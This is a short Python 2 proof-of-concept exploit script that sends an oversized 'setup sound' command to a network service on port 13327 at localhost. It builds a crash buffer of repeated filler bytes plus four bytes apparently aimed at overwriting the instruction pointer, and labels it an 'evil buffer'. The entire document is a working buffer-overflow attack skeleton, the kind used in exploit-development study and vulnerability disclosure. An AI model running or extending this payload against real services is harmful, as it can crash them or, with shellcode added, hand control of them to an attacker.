#!/usr/bin/python

import socket

host = "127.0.0.1"
crash = "\x41" * 4368 + "\x42" * 4 + "\x43" * 7
buffer = "\x11(setup sound " + crash + "\x90\x00#"

  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sedning evil buffer..." 
s.connect((host, 13327))
data = s.recv(1024)
print data
s.send(buffer)
s.close()
